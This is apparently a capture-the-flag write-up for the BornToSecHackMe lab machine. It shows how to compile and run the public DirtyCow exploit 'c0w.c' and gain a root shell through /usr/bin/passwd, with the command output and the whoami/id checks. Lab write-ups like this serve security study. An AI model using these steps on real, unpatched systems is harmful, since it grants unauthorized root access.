[See detailed writeup here](../writeup1.md)

Log in as any user account.

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

Here you can see other different DirtyCow exploits that you can use.

Unlike the previous one, we will use c0w.c this time.


```
gcc -pthread c0w.c  -o c0w
```

Now we will run it...

```
zaz@BornToSecHackMe:~$ ./c0w

   (___)
   (o o)_____/
    @@ `     \
     \ ____, //usr/bin/passwd
     //    //
    ^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap b7e04000

madvise 0

```

All we need to do is;

```
zaz@BornToSecHackMe:~$ /usr/bin/passwd

root@BornToSecHackMe:/home/zaz# whoami
root

root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=1005(zaz) groups=0(root),1005(zaz)
```